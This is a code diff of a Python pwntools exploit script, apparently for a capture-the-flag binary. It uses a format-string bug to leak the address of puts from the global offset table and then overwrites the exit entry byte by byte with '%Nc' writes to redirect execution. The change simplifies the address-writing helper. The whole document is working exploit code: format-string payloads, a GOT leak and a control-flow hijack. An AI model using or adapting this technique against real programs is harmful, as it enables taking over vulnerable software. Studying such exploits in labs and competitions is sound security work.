@@ -17,18 +17,7 @@ def write_addr(offset, addr):
     padding = "A" * offset * 8
     addr = p64(addr)
 
-    writes = []
-
-    indeces = [i for i, x in enumerate(addr) if x == '\0'][::-1]
-
-    addr = addr.replace('\0', 'A')
-    writes.append(padding + addr)
-
-    for x in indeces:
-        writes.append(padding + addr[:x])
-
-    return writes
-
+    return padding + addr
 
 def s_payload(payload):
     log.info("payload %s" % repr(payload))
@@ -43,8 +32,8 @@ PUTS_GOT = b""
 log.info("got expected at %x" % binary.got['puts'])
 
 while len(PUTS_GOT) < 8:
-    for x in write_addr(30, binary.got['puts'] + len(PUTS_GOT)):
-        log.info("return %s" % s_payload(x))
+    x = write_addr(30, binary.got['puts'] + len(PUTS_GOT))
+    log.info("return %s" % s_payload(x))
     PUTS_GOT += s_payload(b"%40$s")[:8]
     if(len(PUTS_GOT) < 8):
         PUTS_GOT += '\0'
@@ -60,8 +49,8 @@ T_ADDR = PUTS_GOT + diff
 log.info("T_ADDR = %x" % (T_ADDR))
 
 for i, x in enumerate(p64(T_ADDR)):
-    for y in write_addr(30, binary.got['exit'] + i):
-        s_payload(y)        
+    y = write_addr(30, binary.got['exit'] + i)
+    s_payload(y)        
     if(x != '\0'):
         payload = "%" + str(ord(x)) + "c"
     else:
